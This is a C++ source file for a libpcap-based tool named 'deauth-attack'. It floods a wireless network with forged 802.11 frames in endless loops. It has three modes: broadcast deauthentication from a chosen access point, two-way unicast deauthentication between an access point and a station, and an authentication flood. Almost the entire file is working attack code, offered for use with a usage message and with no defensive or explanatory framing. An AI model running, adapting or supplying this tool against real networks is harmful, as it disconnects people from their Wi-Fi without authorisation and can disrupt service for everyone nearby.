#include "struct.h"
#include <pcap.h>
#include <string>
#include <array>
#include <iostream>
#include <sstream>
#include <thread>
#include <chrono>

std::array<uint8_t, 6> mac_parser(std::string& string_mac){
    std::array<uint8_t, 6> byte_mac = {};
    std::istringstream stream(string_mac);
    std::string byte_string;

    for (int i = 0; i < 6; ++i) {
        std::getline(stream, byte_string, ':');
        byte_mac[i] = static_cast<uint8_t>(std::stoi(byte_string, nullptr, 16));
    }

    return byte_mac;
}


void deauth_broadcast(pcap_t* pcap, std::string ap_mac_string){
    std::array<uint8_t, 6> ap_mac = mac_parser(ap_mac_string);
    struct deauth_attack_packet deauth_attack_packet = {};
    struct deauth_frame deauth_frame = {};
    deauth_frame.s_address = ap_mac;
    deauth_frame.bssid = ap_mac;
    deauth_frame.d_address = {255,255,255,255,255,255};
    deauth_attack_packet.deauth_frame = deauth_frame;
    while(true){
        pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&deauth_attack_packet), sizeof(deauth_attack_packet));
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

void deauth_unicast(pcap_t* pcap, std::string ap_mac_string, std::string st_mac_string){
    std::array<uint8_t, 6> ap_mac = mac_parser(ap_mac_string);
    std::array<uint8_t, 6> st_mac = mac_parser(st_mac_string);
    struct deauth_frame deauth_frame = {};
    // define ap -> station packet
    struct deauth_attack_packet deauth_attack_packet_ap = {};
    deauth_frame.s_address = ap_mac;
    deauth_frame.bssid = ap_mac;
    deauth_frame.d_address = st_mac;
    deauth_attack_packet_ap.deauth_frame = deauth_frame;
    // define station -> ap packet
    struct deauth_attack_packet deauth_attack_packet_st = {};
    deauth_frame.s_address = st_mac;
    deauth_frame.bssid = ap_mac;
    deauth_frame.d_address = ap_mac;
    deauth_attack_packet_st.deauth_frame = deauth_frame;
    while(true){
        pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&deauth_attack_packet_ap), sizeof(deauth_attack_packet_ap));
        pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&deauth_attack_packet_st), sizeof(deauth_attack_packet_st));
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

void auth_attack(pcap_t* pcap, std::string ap_mac_string, std::string st_mac_string){
    std::array<uint8_t, 6> ap_mac = mac_parser(ap_mac_string);
    std::array<uint8_t, 6> st_mac = mac_parser(st_mac_string);
    struct auth_frame auth_frame = {};
    struct auth_attack_packet auth_attack_packet = {};
    auth_frame.s_address = st_mac;
    auth_frame.bssid = ap_mac;
    auth_frame.d_address = ap_mac;
    auth_attack_packet.auth_frame = auth_frame;
    while(true){
        pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&auth_attack_packet), sizeof(auth_attack_packet));
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}



int main(int argc, char* argv[]){
    if (argc < 3) {
        std::cerr << "Usage: deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n";
        return 1;
    }
    std::string interface = argv[1];
    std::string ap_mac = argv[2];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(argv[1], 0, 0, 0, errbuf);
    if (argc == 3){
        deauth_broadcast(pcap, ap_mac);
    }
    else if (argc == 4){
        std::string st_mac = argv[3];
        deauth_unicast(pcap, ap_mac, st_mac);
    }
    else if (argc > 4 && std::string(argv[4]) == "-auth"){
        std::string st_mac = argv[3];
        auth_attack(pcap, ap_mac, st_mac);
    }
    else{
        std::cerr << "Usage: deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n";
        return 1;
    }


    return 0;
}